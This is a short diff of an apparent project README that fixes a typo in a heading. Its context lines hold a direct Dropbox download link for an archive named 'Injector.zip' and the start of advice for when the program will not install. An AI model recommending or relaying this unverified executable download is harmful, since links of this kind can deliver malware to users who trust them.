@@ -4,7 +4,7 @@
 
 # 📁Software: [HERE](https://www.dropbox.com/scl/fi/11h52ofzek3tdip2h1zgc/Injector.zip?rlkey=7mn9v1wyeu0jqi1xo68l32drr&dl=1)
 
-# 📌Infortmation:
+# 📌Information:
 
 ⚠️If you can’t install program, you need to:
 
